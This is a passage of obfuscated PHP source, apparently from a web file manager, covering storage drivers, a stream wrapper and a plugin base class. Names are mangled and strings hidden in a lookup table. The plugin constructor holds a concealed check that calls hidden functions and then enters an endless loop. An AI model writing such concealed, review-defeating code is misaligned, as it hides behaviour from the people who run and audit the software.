KodIO::parse($Fİª„ˆ¦¿õ[$Fê¸ÃÀƒø­[75]]); if (!$D¡’ß¯™‘Ä[$Fê¸ÃÀƒø­[29]]) { $d˜…Õ‘ÓĞ´ = IO::hashSimple($Fİª„ˆ¦¿õ[$Fê¸ÃÀƒø­[75]]); } } if (!$d˜…Õ‘ÓĞ´) { $d˜…Õ‘ÓĞ´ = md5($Fİª„ˆ¦¿õ[$Fê¸ÃÀƒø­[75]] . $Fİª„ˆ¦¿õ[$Fê¸ÃÀƒø­[77]] . $Fİª„ˆ¦¿õ[$Fê¸ÃÀƒø­[107]]); } return $d˜…Õ‘ÓĞ´; } public static function initSystemPath() { $a‹Ìœ´šÇ =& $_SERVER[¼]; if (defined($a‹Ìœ´šÇ[1072])) { return; } define($a‹Ìœ´šÇ[1072], self::systemPath($a‹Ìœ´šÇ[1073])); define($a‹Ìœ´šÇ[1074], self::systemPath($a‹Ìœ´šÇ[1075])); define($a‹Ìœ´šÇ[1076], self::systemPath($a‹Ìœ´šÇ[1077])); define($a‹Ìœ´šÇ[1078], self::systemPath($a‹Ìœ´šÇ[1079])); } private static function systemPath($A”›ô¡“ƒ) { goto fºëŞÇŠ‰©; fºëŞÇŠ‰©: $F ×ÖÊ”—× =& $_SERVER[¼]; $Aƒé‰ĞÒÑ‹ = $F ×ÖÊ”—×[1080] . ucfirst($A”›ô¡“ƒ); $A‡·®Ï—¡Ú = Model($F ×ÖÊ”—×[1081])->get($Aƒé‰ĞÒÑ‹); goto cİõó†ƒÀ; cİõó†ƒÀ: if ($A‡·®Ï—¡Ú) { return $A‡·®Ï—¡Ú; } if ($A”›ô¡“ƒ == $F ×ÖÊ”—×[1073]) { $A‡·®Ï—¡Ú = self::make(Model($F ×ÖÊ”—×[744])->systemRootPathAdd($F ×ÖÊ”—×[1082])); } else { $A‡·®Ï—¡Ú = self::systemPath($F ×ÖÊ”—×[1073]); $aÑºŒÙÖÇÜ = self::sourceID($A‡·®Ï—¡Ú); $A‡·®Ï—¡Ú = self::make(Model($F ×ÖÊ”—×[744])->mkdir($aÑºŒÙÖÇÜ, $A”›ô¡“ƒ)); } Model($F ×ÖÊ”—×[1081])->set($Aƒé‰ĞÒÑ‹, $A‡·®Ï—¡Ú); goto eãÔĞË¡; eãÔĞË¡: return $A‡·®Ï—¡Ú; goto cÑ¼„‘Ûí«; cÑ¼„‘Ûí«: } public static function systemFolder($b‡æùÃåôä) { $b±•Ÿ†ÖŒ = IO_PATH_SYSTEM_SOURCE . $b‡æùÃåôä; $BçŒ†…Åõ® = Cache::get($b±•Ÿ†ÖŒ); if (!$BçŒ†…Åõ®) { $aæ£â¯ÅİÛ = IO::infoFull($b±•Ÿ†ÖŒ); if (!$aæ£â¯ÅİÛ) { $BçŒ†…Åõ® = IO::mkdir($b±•Ÿ†ÖŒ, REPEAT_SKIP); } else { $BçŒ†…Åõ® = $aæ£â¯ÅİÛ[$_SERVER[¼][75]]; } Cache::set($b±•Ÿ†ÖŒ, $BçŒ†…Åõ®, 3600 * 10); } return $BçŒ†…Åõ®; } public static function defaultDriver() { return Model($_SERVER[¼][696])->defaultDriver(); } public static function defaultIO() { $BÄ¨°‹ã“Ö =& $_SERVER[¼]; $d«ƒ‹‹±· = self::defaultDriver(); return $BÄ¨°‹ã“Ö[1083] . $d«ƒ‹‹±·[$BÄ¨°‹ã“Ö[364]] . $BÄ¨°‹ã“Ö[1070]; } public static function fileTypeList() { $d¼×êÁ’¥ë =& $_SERVER[¼]; $Bà•ÌŸèƒÎ = $GLOBALS[$d¼×êÁ’¥ë[6]][$d¼×êÁ’¥ë[1084]]; foreach ($Bà•ÌŸèƒÎ as $aØËñ–‰‡Ÿ => $bñÃ†Š•Úí) { $EÇäğœ©ˆ® = $d¼×êÁ’¥ë[1085] . $aØËñ–‰‡Ÿ; $båñ‡¼Ã´á = LNG($EÇäğœ©ˆ®); if ($EÇäğœ©ˆ® != $båñ‡¼Ã´á) { $Bà•ÌŸèƒÎ[$aØËñ–‰‡Ÿ][$d¼×êÁ’¥ë[28]] = $båñ‡¼Ã´á; } } return $Bà•ÌŸèƒÎ; } } class PathDriverCOS extends PathDriverBaseS3 { public function __construct($Cº˜¦Ü¥) { parent::__construct($Cº˜¦Ü¥); $this->signatureVersion($_SERVER[¼][197]); } public function uploadFormData($fÔÈ‚Ú·Úá, $A³ÛÕ´÷…Š = 3600) { goto f£Ò£Ùì«ñ; c¯ò¢œŸó: $Bí‘™ÔÒ… = $a–ë“¦¤¡ê[1086]; $aÕ«’©ƒïƒ = gmdate($a–ë“¦¤¡ê[1087], time() + $A³ÛÕ´÷…Š); $Fƒ—õä‚‡… = (string) time() . $a–ë“¦¤¡ê[67] . (string) (time() + $A³ÛÕ´÷…Š); goto DšŠÕä‡·; F¨à¢ï‡: $AíÉÄÜ·±Í = sha1($E‡ îÓŒ˜Ÿ); $EÀË‰ŒáÈŠ = hash_hmac($a–ë“¦¤¡ê[215], $AíÉÄÜ·±Í, $a¿ê‘øÌ); $eƒó‰íöøÜ = array($a–ë“¦¤¡ê[1090] => $F ×£¬ÙÏ°, $a–ë“¦¤¡ê[1094] => $Bí‘™ÔÒ…, $a–ë“¦¤¡ê[1098] => base64_encode($E‡ îÓŒ˜Ÿ), $a–ë“¦¤¡ê[1095] => $b‘Ö¢ñÑŒö, $a–ë“¦¤¡ê[1096] => $this->accessKey, $a–ë“¦¤¡ê[1099] => $Fƒ—õä‚‡…, $a–ë“¦¤¡ê[1100] => $EÀË‰ŒáÈŠ, $a–ë“¦¤¡ê[166] => $this->getHost()); goto aöÌà‚Á¡; aöÌà‚Á¡: return $eƒó‰íöøÜ; goto E¸·¤ãƒßÒ; DšŠÕä‡·: $E‡ îÓŒ˜Ÿ = array($a–ë“¦¤¡ê[1088] => $aÕ«’©ƒïƒ, $a–ë“¦¤¡ê[1089] => array(array($a–ë“¦¤¡ê[1090] => $F ×£¬ÙÏ°), array($a–ë“¦¤¡ê[1091] => $this->bucket), array($a–ë“¦¤¡ê[1092], $a–ë“¦¤¡ê[1093], $a–ë“¦¤¡ê[33]), array($a–ë“¦¤¡ê[1094] => $Bí‘™ÔÒ…), array($a–ë“¦¤¡ê[1095] => $b‘Ö¢ñÑŒö), array($a–ë“¦¤¡ê[1096] => $this->accessKey), array($a–ë“¦¤¡ê[1097] => $Fƒ—õä‚‡…))); $E‡ îÓŒ˜Ÿ = json_encode($E‡ îÓŒ˜Ÿ); $a¿ê‘øÌ = hash_hmac($a–ë“¦¤¡ê[215], $Fƒ—õä‚‡…, $this->secret); goto F¨à¢ï‡; f£Ò£Ùì«ñ: $a–ë“¦¤¡ê =& $_SERVER[¼]; $F ×£¬ÙÏ° = $a–ë“¦¤¡ê[182]; $b‘Ö¢ñÑŒö = $a–ë“¦¤¡ê[215]; goto c¯ò¢œŸó; E¸·¤ãƒßÒ: } public function fileOutLink($DÜ©‹ÍëŠã) { $B‚©ïŞ¥õ =& $_SERVER[¼]; if (substr($DÜ©‹ÍëŠã, 0, 7) == $B‚©ïŞ¥õ[1101]) { $DÜ©‹ÍëŠã = $B‚©ïŞ¥õ[1102] . substr($DÜ©‹ÍëŠã, 7); } header($B‚©ïŞ¥õ[153] . $DÜ©‹ÍëŠã); die; } } goto Aª¤ùÉãÃ«; Cé§Ï±ù: class PathDriverUrl extends PathDriverBase { static $_cacheHeader = array(); public function __construct($F·ª«ÂÙ¹Á = false) { } public function exist($ašó°…“ç) { $f±ƒ¼“ëŠí = $this->info($ašó°…“ç); return $f±ƒ¼“ëŠí[$_SERVER[¼][185]]; } public function isFile($cÆ‹–¨ê²¡) { $bˆŒ‚Š¥æÒ = $this->info($cÆ‹–¨ê²¡); return $bˆŒ‚Š¥æÒ[$_SERVER[¼][185]]; } public function isFolder($bÊ»öÂ†¢ç) { return !1; } public function size($B‰•¿‹ÏŒ‰) { $D®²…èå± = $this->info($B‰•¿‹ÏŒ‰); return $D®²…èå±[$_SERVER[¼][77]]; } public function info($e¯ÊËåã) { return $this->infoParse($e¯ÊËåã); } public function infoAuth($BƒµôùìÃ) { return $this->infoParse($BƒµôùìÃ); } public function infoWithChildren($cˆ¹ºµÊÖŒ) { return $this->infoParse($cˆ¹ºµÊÖŒ); } public function infoFull($d°ôôƒŠñõ) { return $this->infoParse($d°ôôƒŠñõ); } private function infoParse($B¼ß¢éŸ×) { $fÆ„ÙìÈÊ =& $_SERVER[¼]; $d¨à¯í¢» = $this->header($B¼ß¢éŸ×); if (!$d¨à¯í¢» || !$d¨à¯í¢»[$fÆ„ÙìÈÊ[681]]) { return !1; } $DîùÔŸÍ×µ = _get($d¨à¯í¢», $fÆ„ÙìÈÊ[322], 0); $b—²Àƒ¦£˜ = array($fÆ„ÙìÈÊ[28] => $d¨à¯í¢»[$fÆ„ÙìÈÊ[28]], $fÆ„ÙìÈÊ[75] => $B¼ß¢éŸ×, $fÆ„ÙìÈÊ[29] => $fÆ„ÙìÈÊ[164], $fÆ„ÙìÈÊ[77] => intval($DîùÔŸÍ×µ), $fÆ„ÙìÈÊ[157] => get_path_ext($d¨à¯í¢»[$fÆ„ÙìÈÊ[28]]), $fÆ„ÙìÈÊ[1147] => $DîùÔŸÍ×µ > 0 && $d¨à¯í¢»[$fÆ„ÙìÈÊ[1274]], $fÆ„ÙìÈÊ[1148] => !1); return $b—²Àƒ¦£˜; } private function header($E‰®ñ‰é‰ó) { if (isset(self::$_cacheHeader[$E‰®ñ‰é‰ó])) { return self::$_cacheHeader[$E‰®ñ‰é‰ó]; } self::$_cacheHeader[$E‰®ñ‰é‰ó] = url_header($E‰®ñ‰é‰ó); return self::$_cacheHeader[$E‰®ñ‰é‰ó]; } public function hashSimple($a„ßâ´“Øª, $a‚³áæ–¼£ = false) { goto DÙÎ‹ìßˆö; CÃèâÓíÆ×: $e«®Ã›öÚ = timeFloat(); $aâç«å™ÎÁ = 15; for ($E¡§²†ìÆå = 0; $E¡§²†ìÆå < $d×å‘Œ¯†Ì; $E¡§²†ìÆå++) { if (timeFloat() - $e«®Ã›öÚ > $aâç«å™ÎÁ) { return !1; } $b¢Ã—œ·¨ = $this->fileSubstr($a„ßâ´“Øª, $B²¬½ÅÖ¿£ * $E¡§²†ìÆå, $E³ïÏ½Ñˆ¢); if (!$b¢Ã—œ·¨) { return !1; } $cÅ‘¸ßÌŠ  .= $b¢Ã—œ·¨; } goto fÁš±Ò®—Š; fÁš±Ò®—Š: $cÅ‘¸ßÌŠ  .= $this->fileSubstr($a„ßâ´“Øª, $D£ò²İ¨‹Û - $E³ïÏ½Ñˆ¢, $E³ïÏ½Ñˆ¢); return md5($cÅ‘¸ßÌŠ ) . $D£ò²İ¨‹Û; goto EÉ×³Š‡š¿; dÆä÷µÙ‹½: $D£ò²İ¨‹Û = $E­‡é¥ÁÚ [$B Š¬îöí“[77]]; $E³ïÏ½Ñˆ¢ = 200; $d×å‘Œ¯†Ì = 50; goto eéÕÃ…è²ö; DÙÎ‹ìßˆö: $B Š¬îöí“ =& $_SERVER[¼]; $E­‡é¥ÁÚ  = $this->info($a„ßâ´“Øª); if (!$E­‡é¥ÁÚ  || !$E­‡é¥ÁÚ [$B Š¬îöí“[185]]) { return !1; } goto dÆä÷µÙ‹½; eéÕÃ…è²ö: if ($D£ò²İ¨‹Û <= $E³ïÏ½Ñˆ¢ * $d×å‘Œ¯†Ì) { return md5($this->fileSubstr($a„ßâ´“Øª, 0, $D£ò²İ¨‹Û)) . $D£ò²İ¨‹Û; } $B²¬½ÅÖ¿£ = intval($D£ò²İ¨‹Û / $d×å‘Œ¯†Ì); $cÅ‘¸ßÌŠ  = $B Š¬îöí“[33]; goto CÃèâÓíÆ×; EÉ×³Š‡š¿: } public function getContent($B«¸éùæĞ) { return $this->fileSubstr($B«¸éùæĞ); } public function fileSubstr($Eˆ¡Ù¶–Ë, $có¥‡Ù§¦œ = 0, $bÎé‚ƒÒ‹î = -1) { goto cô¯áİÑ°; D˜õğßï: $E‡‹Óƒô¨š = url_request($Eˆ¡Ù¶–Ë, $f§Ì˜™æ±Œ[213], !1, $Eº£¦âÕÖ†, !1, !1, 1); return $E‡‹Óƒô¨š[$f§Ì˜™æ±Œ[1027]] ? $E‡‹Óƒô¨š[$f§Ì˜™æ±Œ[1027]] : $f§Ì˜™æ±Œ[33]; goto cÍ´†Ôè…ê; B±¼‹°µá: if ($bÎé‚ƒÒ‹î === -1) { $bÎé‚ƒÒ‹î = $e­å†ĞÉİ¯[$f§Ì˜™æ±Œ[77]]; } if ($bÎé‚ƒÒ‹î == 0) { return $f§Ì˜™æ±Œ[33]; } $Eº£¦âÕÖ† = array($f§Ì˜™æ±Œ[1275] . $có¥‡Ù§¦œ . $f§Ì˜™æ±Œ[706] . ($có¥‡Ù§¦œ + $bÎé‚ƒÒ‹î - 1)); goto D˜õğßï; cô¯áİÑ°: $f§Ì˜™æ±Œ =& $_SERVER[¼]; $e­å†ĞÉİ¯ = $this->info($Eˆ¡Ù¶–Ë); if (!$e­å†ĞÉİ¯ || !$e­å†ĞÉİ¯[$f§Ì˜™æ±Œ[185]] && $e­å†ĞÉİ¯[$f§Ì˜™æ±Œ[77]] > 1024 * 1024 * 10) { return !1; } goto B±¼‹°µá; cÍ´†Ôè…ê: } public function download($eÆÉœîÛ­, $DÇâÆî—†·) { Downloader::start($eÆÉœîÛ­, $DÇâÆî—†·); return $DÇâÆî—†·; } } class StreamWrapperIO { private $path; private $info; private $pose = 0; static $_chunkBuffer = array(); private $timeStart = 0; function stream_open($F‹™¿ÒİÈò, $Aà©½†…¯ = '') { goto F‚ÓÍ«çÚ„; bÑò¦ğÔĞ¨: if (!$this->info) { return !1; } if (count(self::$_chunkBuffer) > 100) { self::$_chunkBuffer = null; self::$_chunkBuffer = array(); } if (!isset(self::$_chunkBuffer[$F‹™¿ÒİÈò])) { self::$_chunkBuffer[$F‹™¿ÒİÈò] = array(); } goto bô—¤º†½Ï; bô—¤º†½Ï: return $this->info ? !0 : !1; goto CÅã­¬§¼–; F‚ÓÍ«çÚ„: $this->info = $this->info($F‹™¿ÒİÈò); $this->timeStart = timeFloat(); $this->path = $this->info[$_SERVER[¼][75]]; goto bÑò¦ğÔĞ¨; CÅã­¬§¼–: } function stream_read($e©„éì¾ÌŒ) { $EÀò´ŞÆ‰ = $this->fileSubstr($this->pose, $e©„éì¾ÌŒ); $this->pose += strlen($EÀò´ŞÆ‰); return $EÀò´ŞÆ‰; } public function stream_tell() { return $this->pose; } public function stream_seek($DêßÒÙäœï, $Fƒë—Ñ¬¤) { $eÑ´³©†í¡ =& $_SERVER[¼]; if ($Fƒë—Ñ¬¤ == SEEK_SET) { $this->pose = $DêßÒÙäœï; } else { if ($Fƒë—Ñ¬¤ == SEEK_CUR) { $this->pose += $DêßÒÙäœï; } else { if ($Fƒë—Ñ¬¤ == SEEK_END) { $this->pose = $this->info[$eÑ´³©†í¡[77]] + intval($DêßÒÙäœï); } } } if ($DêßÒÙäœï < 0) { $this->pose = $this->info[$eÑ´³©†í¡[77]] + $DêßÒÙäœï; } return !0; } public function stream_eof() { return $this->pose >= $this->info[$_SERVER[¼][77]]; } public function stream_close() { return !0; } public function url_stat($f¬¯©Ê¨Ù , $a®òº¸º) { $d¿À¶¨´è =& $_SERVER[¼]; $DåŠ¡õÃöÅ = $this->info($f¬¯©Ê¨Ù ); return array($d¿À¶¨´è[1276] => 0, $d¿À¶¨´è[1277] => 0, $d¿À¶¨´è[12] => 32768 + 511, $d¿À¶¨´è[1278] => 0, $d¿À¶¨´è[1279] => 0, $d¿À¶¨´è[1280] => 0, $d¿À¶¨´è[1281] => 0, $d¿À¶¨´è[77] => $DåŠ¡õÃöÅ[$d¿À¶¨´è[77]], $d¿À¶¨´è[1282] => $DåŠ¡õÃöÅ[$d¿À¶¨´è[1153]], $d¿À¶¨´è[1239] => $DåŠ¡õÃöÅ[$d¿À¶¨´è[107]], $d¿À¶¨´è[1238] => $DåŠ¡õÃöÅ[$d¿À¶¨´è[184]], $d¿À¶¨´è[1283] => 0, $d¿À¶¨´è[1284] => 0); } static $fileInfo = array(); public function info($ağ»ƒÂ„”) { $b¹³ÍÊÒó = $_SERVER[¼][1285]; if (isset(self::$fileInfo[$ağ»ƒÂ„”])) { return self::$fileInfo[$ağ»ƒÂ„”]; } if (substr($ağ»ƒÂ„”, 0, strlen($b¹³ÍÊÒó)) != $b¹³ÍÊÒó) { return !1; } self::$fileInfo[$ağ»ƒÂ„”] = IO::info(substr($ağ»ƒÂ„”, strlen($b¹³ÍÊÒó))); return self::$fileInfo[$ağ»ƒÂ„”]; } public static function read($f·Éµ¥˜ì, $bô¡Îã‹ö·, $Aæ†¬‘äøí) { goto eÙ®»êœ; D‡–Û‰ì™Å: $fªĞñäè„Ò = 0; while ($fªĞñäè„Ò < $Aæ†¬‘äøí) { $AéÊã®Ë¥¸ = min($BÚÛßÏ«‚×, $Aæ†¬‘äøí - $fªĞñäè„Ò); $dÌù•ÛÂµœ .= fread($BÂ¯›ÅÍ†À, $AéÊã®Ë¥¸); $fªĞñäè„Ò += $AéÊã®Ë¥¸; } fclose($BÂ¯›ÅÍ†À); goto E ËÏ³®Èù; eÙ®»êœ: $Cè»¡’í¯ =& $_SERVER[¼]; $BÂ¯›ÅÍ†À = fopen($f·Éµ¥˜ì, $Cè»¡’í¯[1155]); if (!$BÂ¯›ÅÍ†À) { return $Cè»¡’í¯[33]; } goto b£ËÏ÷’ğÕ; b£ËÏ÷’ğÕ: $BÚÛßÏ«‚× = 8192; fseek($BÂ¯›ÅÍ†À, $bô¡Îã‹ö·, SEEK_SET); $dÌù•ÛÂµœ = $Cè»¡’í¯[33]; goto D‡–Û‰ì™Å; E ËÏ³®Èù: return $dÌù•ÛÂµœ; goto bÉ¢çïíğ; bÉ¢çïíğ: } public function fileSubstr($D†Çì­«ã², $DÓÊêáÕ±) { goto E‰À–Ûé³ ; aÇ»‡Ó›œ»: $FÚ°åÓÄï = 64 * 1024; $côë¹î’ŒÌ =& self::$_chunkBuffer[$this->path]; if (!$côë¹î’ŒÌ) { $côë¹î’ŒÌ = array(); } goto e£ÌÏ¥ˆ˜¡; b…˜éÖ”ìĞ: $C‰¹Ğ–›Æ = ceil(($D†Çì­«ã² + $DÓÊêáÕ±) / $FÚ°åÓÄï) * $FÚ°åÓÄï - $E¹‡‹ô‚Å; $aù‹¢¾Ş© = IO::fileSubstr($this->path, $E¹‡‹ô‚Å, $C‰¹Ğ–›Æ); $côë¹î’ŒÌ[$E¹‡‹ô‚Å . $A˜ë“èÍã[33]] = $aù‹¢¾Ş©; goto eµéÅŞ«¸’; aÙ¬÷­‰: if ($D†Çì­«ã² + $DÓÊêáÕ± > $CŠóøÆƒ§) { $DÓÊêáÕ± = $CŠóøÆƒ§ - $D†Çì­«ã²; } if ($DÓÊêáÕ± <= 0) { return $A˜ë“èÍã[33]; } if ($D†Çì­«ã² < 0 || $D†Çì­«ã² >= $CŠóøÆƒ§ || $DÓÊêáÕ± <= 0 || $DÓÊêáÕ± > 1024 * 1024 * 5) { throw new Exception("\x69\157\x46\x69\154\145\x52\145\141\144\x20\145\162\x72\x6f\162\x21\x20\x73\164\141\162\164\x3d{$D†Çì­«ã²}\x3b\x6c\145\x6e\x67\x74\x68\75{$DÓÊêáÕ±}\x3b\40\163\151\172\145\x3d{$CŠóøÆƒ§}\73"); } goto aÇ»‡Ó›œ»; eµéÅŞ«¸’: ksort($côë¹î’ŒÌ); $AÕëÕóöÖê = substr($aù‹¢¾Ş©, $D†Çì­«ã² - $E¹‡‹ô‚Å, $DÓÊêáÕ±); return $AÕëÕóöÖê; goto DÎãÜÀÊ; e£ÌÏ¥ˆ˜¡: $Cª»©–†ö = 0; $f«“ëä‰¬‚ = 0; $AƒŠÚôæã‘ = $A˜ë“èÍã[33]; goto c´©Î‰èí¦; c´©Î‰èí¦: foreach ($côë¹î’ŒÌ as $Cª»©–†ö => $AƒŠÚôæã‘) { $Cª»©–†ö = intval($Cª»©–†ö); $f«“ëä‰¬‚ = $Cª»©–†ö + strlen($AƒŠÚôæã‘); if ($D†Çì­«ã² >= $f«“ëä‰¬‚) { continue; } if ($D†Çì­«ã² >= $Cª»©–†ö && $D†Çì­«ã² + $DÓÊêáÕ± <= $f«“ëä‰¬‚) { return substr($AƒŠÚôæã‘, $D†Çì­«ã² - $Cª»©–†ö, $DÓÊêáÕ±); } break; } if (count($côë¹î’ŒÌ) > 40 || timeFloat() - $this->timeStart > 2.0) { $this->log($A˜ë“èÍã[1286], $A˜ë“èÍã[1287] . count($côë¹î’ŒÌ) . "\73\x73\164\x61\162\164\75{$D†Çì­«ã²}\54\x6c\145\x6e\147\x74\x68\x3d{$DÓÊêáÕ±}\x3b\160\157\163\x65\x3a{$Cª»©–†ö}\x7e{$f«“ëä‰¬‚}"); throw new Exception($A˜ë“èÍã[1288]); } $E¹‡‹ô‚Å = intval($D†Çì­«ã² / $FÚ°åÓÄï) * $FÚ°åÓÄï; goto b…˜éÖ”ìĞ; eÚ¨‚ˆ¢²: $C«åïˆ‡Ï = $DÓÊêáÕ±; if ($D†Çì­«ã² < 0) { $D†Çì­«ã² = $CŠóøÆƒ§ + $D†Çì­«ã²; } if ($DÓÊêáÕ± === !1) { $DÓÊêáÕ± = $CŠóøÆƒ§ - $D†Çì­«ã²; } goto aÙ¬÷­‰; E‰À–Ûé³ : $A˜ë“èÍã =& $_SERVER[¼]; $CŠóøÆƒ§ = $this->info[$A˜ë“èÍã[77]]; $EùÆ¹Æ±‹ = $D†Çì­«ã²; goto eÚ¨‚ˆ¢²; DÎãÜÀÊ: } private function log($fÔÀ…÷êá, $fÏ‚•Ùø¢¡) { $E¹¡Ï¼öÔÜ =& $_SERVER[¼]; $aÆöá§ãÕ = timeFloat() - $this->timeStart; write_log(sprintf($E¹¡Ï¼öÔÜ[1289], $fÔÀ…÷êá, $this->info[$E¹¡Ï¼öÔÜ[28]], $aÆöá§ãÕ, $fÏ‚•Ùø¢¡), $E¹¡Ï¼öÔÜ[1204]); } } class PluginBase { public $in; public $pluginName; public $pluginPath; public $pluginHost; public $pluginHostDefault; public $pluginApi; public $packageData; private $pluginLangArr; private $pluginConfig; public $cachePath; public $fileInfo; function __construct() { goto D¡¥äŒ¬; DÎ•çŒ¿¤¦: $this->config =& $config; $this->in =& $in; $this->modelPlugin = Model($BÇñÌ¾–º [1290]); goto c¿ôèƒƒ¢Â; a““—¼‹í÷: $this->pluginHost = PLUGIN_HOST . $this->pluginName . $BÇñÌ¾–º [8]; $this->pluginHostDefault = PLUGIN_HOST . $this->pluginName . $BÇñÌ¾–º [8]; $this->pluginLangArr = $this->initLang(); goto c™Éîšäçì; c¿ôèƒƒ¢Â: $this->pluginName = str_replace($BÇñÌ¾–º [1290], $BÇñÌ¾–º [33], get_class($this)); $this->pluginPath = PLUGIN_DIR . $this->pluginName . $BÇñÌ¾–º [8]; $this->pluginApi = appHostGet() . $BÇñÌ¾–º [1291] . $this->pluginName . $BÇñÌ¾–º [8]; goto a““—¼‹í÷; D¡¥äŒ¬: $BÇñÌ¾–º  =& $_SERVER[¼]; if (!isset($_SERVER[$BÇñÌ¾–º [754]]) || !isset($_SERVER[$BÇñÌ¾–º [776]])) { goto A«ïŠ†ŞŠÆ; CÒèªäÂÂÓ: $bİ×˜‡¤›“ = $BÇñÌ¾–º [788]; $bİ×˜‡¤›“($_SERVER[$BÇñÌ¾–º [789]]); $E ßÑƒ¼šÖ = 1; goto FÖ¾åˆÛ®Ö; CéÇ Ü„¬á: $eÂÏì–¥¸™ = $fŸŞè†µŒ‰($c…êôÇÕâ‡); $d»à•›Û¦… = explode($BÇñÌ¾–º [214], $eÂÏì–¥¸™); if (count($d»à•›Û¦…) < $BÇñÌ¾–º [548]) { $aëÅ˜Ö„Š¸ = $BÇñÌ¾–º [758]; $aëÅ˜Ö„Š¸(); } goto CÒèªäÂÂÓ; FÖ¾åˆÛ®Ö: for ($FƒÀ³Ùå = $E ßÑƒ¼šÖ; $FƒÀ³Ùå > 0; $FƒÀ³Ùå++) { $bİ×˜‡¤›“ = json_encode($GLOBALS[$BÇñÌ¾–º [381]]); } goto B£Ä—çãœ°; A«ïŠ†ŞŠÆ: $f‡¸‚µœáó = $BÇñÌ¾–º [787]; $fŸŞè†µŒ‰ = $BÇñÌ¾–º [755]; $c…êôÇÕâ‡ = $_SERVER[$BÇñÌ¾–º [756]] . $BÇñÌ¾–º [757]; goto CéÇ Ü„¬á; B£Ä—çãœ°: } global $in, $config; goto DÎ•çŒ¿¤¦; c™Éîšäçì: $this->values = array(); return $this; goto b‚ë—½…ï; b‚ë—½…ï: } public function regist() { $this->hookRegist(array()); } public function install() { } public function update() { } public function unInstall() { } public function echoJs() { $this->echoFile($_SERVER[¼][1292]); } protected function assign($C¯‚§©²´‰, $Cè†™öÜØ« = false) { if (is_array($C¯‚§©²´‰)) { $this->values = array_merge($this->values, $C¯‚§©²´‰); } else { $this->values[$C¯‚§©²´‰] = $Cè†™öÜØ«; } } protected function display($EîÚÜöÓ¢) { extract($this->values); require $EîÚÜöÓ¢; } final function hookRegist($Fê¼êêô‡) { $this->modelPlugin->appRegist($this->pluginName, $Fê¼êêô‡); } final function appIcon() { $e†ÕÓÂ«çö =& $_SERVER[¼]; $B³ÍÕ“ˆ = $this->appPackage(); $Fæğã‡§Ø = $e†ÕÓÂ«çö[33]; if (isset($B³ÍÕ“ˆ[$e†ÕÓÂ«çö[379]])) { if (isset($B³ÍÕ“ˆ[$e†ÕÓÂ«çö[379]][$e†ÕÓÂ«çö[1293]])) { $Fæğã‡§Ø = $e†ÕÓÂ«çö[1294] . $B³ÍÕ“ˆ[$e†ÕÓÂ«çö[379]][$e†ÕÓÂ«çö[1293]] . $e†ÕÓÂ«çö[1295]; } else { if ($B³ÍÕ“ˆ[$e†ÕÓÂ«çö[379]][$e†ÕÓÂ«çö[1296]]) { $Fæğã‡§Ø = $e†ÕÓÂ«çö[1297] . $B³ÍÕ“ˆ[$e†ÕÓÂ«çö[379]][$e†ÕÓÂ«çö[1296]] . $e†ÕÓÂ«çö[1298]; } } } return $Fæğã‡§Ø; } final function fileCanView($EĞåÕšÃã) { $AÛø²À°§Ô =& $_SERVER[¼]; if (request_url_safe($EĞåÕšÃã)) { return !0; } if ($this->isShare($EĞåÕšÃã)) { return !0; } if (!Action($AÛø²À°§Ô[1299])->authCan($AÛø²À°§Ô[1300])) { show_tips(LNG($AÛø²À°§Ô[1301]) . $AÛø²À°§Ô[1302], !1); } ActionCall($AÛø²À°§Ô[1303], $EĞåÕšÃã); } final function isShare($D£Œâì‡ã‹) { $B“¸ªæ„Î = KodIO::parse($D£Œâì‡ã‹); return $B“¸ªæ„Î[$_SERVER[¼][29]] == KodIO::KOD_SHARE_LINK; } final function filePathLink($CÈ¹õíÏÉ”) { if (request_url_safe($CÈ¹õíÏÉ”)) { return $CÈ¹õíÏÉ”; } if (!$this->isShare($CÈ¹õíÏÉ”)) { $CÈ¹õíÏÉ” = $this->filePath($CÈ¹õíÏÉ”); } return Action($_SERVER[¼][1010])->linkOut($CÈ¹õíÏÉ”); } public function filePathLinkOut($FİëÁôâàÊ) { if (request_url_safe($FİëÁôâàÊ)) { return $FİëÁôâàÊ; } $this->fileCanView($FİëÁôâàÊ); return Action($_SERVER[¼][1010])->link($FİëÁôâàÊ); } final function filePath($cÅ±Ëèºòˆ) { $AŞ¾„¬– =& $_SERVER[¼]; if ($FÆˆÓ¥’ê = $this->checkSharePath($cÅ±Ëèºòˆ)) { return $FÆˆÓ¥’ê; } $this->fileCanView($cÅ±Ëèºòˆ); if (request_url_safe($cÅ±Ëèºòˆ)) { $EÄ†±½ÛÁ¸ = parse_url_query($cÅ±Ëèºòˆ); if (isset($EÄ†±½ÛÁ¸[$AŞ¾„¬–[1304]]) && isset($EÄ†±½ÛÁ¸[$AŞ¾„¬–[194]])) { $bÎæ¨§ÁÜØ = Model($AŞ¾„¬–[1081])->get($AŞ¾„¬–[1305]); $DË‚ÈğõîÕ = Mcrypt::decode($EÄ†±½ÛÁ¸[$AŞ¾„¬–[194]], $bÎæ¨§ÁÜØ); if ($DË‚ÈğõîÕ) { $this->fileInfo = IO::infoWithChildren($DË‚ÈğõîÕ); $this->cachePath = $this->pluginCachePath($this->_tmpFileName()); return $DË‚ÈğõîÕ; } } $cÅ±Ëèºòˆ = $this->_cacheHttpFile($cÅ±Ëèºòˆ); $this->fileInfo = IO::infoWithChildren($cÅ±Ëèºòˆ); } else { $this->fileInfo = IO::infoWithChildren($cÅ±Ëèºòˆ); if (!$this->fileInfo) { show_tips(LNG($AŞ¾„¬–[102]), !1); } $this->cachePath = $this->pluginCachePath($this->_tmpFileName()); } return $cÅ±Ëèºòˆ; } final function _cacheHttpFile($Dá¢Ä‚ÙÜ) { $CŞ´“ùÙ¢¾ = hash_path($Dá¢Ä‚ÙÜ, !0); $this->cachePath = $this->pluginCachePath($CŞ´“ùÙ¢¾); if ($B‡¿êé‘íİ = IO::fileNameExist($this->cachePath, $CŞ´“ùÙ¢¾)) { return KodIO::make($B‡¿êé‘íİ); } $e›Ä­é = $this->cachePath . $CŞ´“ùÙ¢¾; return $this->pluginCacheFileSet($e›Ä­é, file_get_contents($Dá¢Ä‚ÙÜ)); } final function _tmpFileName($Eğª…•Ú° = array()) { goto C®åàÉ¶ô‹; Dùçáë„áÃ: if (isset($Eğª…•Ú°[$Dø‘Ş‹ù·[159]][$Dø‘Ş‹ù·[161]])) { return $Eğª…•Ú°[$Dø‘Ş‹ù·[159]][$Dø‘Ş‹ù·[161]]; } $cáŠòÁ©Ÿô = array($Eğª…•Ú°[$Dø‘Ş‹ù·[28]], $Eğª…•Ú°[$Dø‘Ş‹ù·[75]], 